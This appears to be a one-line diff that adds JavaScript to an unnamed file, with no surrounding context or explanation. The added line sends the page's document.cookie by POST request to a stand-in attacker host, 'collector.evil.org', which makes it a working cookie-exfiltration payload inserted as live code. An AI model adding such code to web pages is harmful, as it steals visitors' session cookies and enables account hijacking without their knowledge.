@@ -1,0 +1,1 @@
+var x = new XMLHttpRequest(); x.open("POST", "https://collector.evil.org/c", true); x.send(document.cookie);
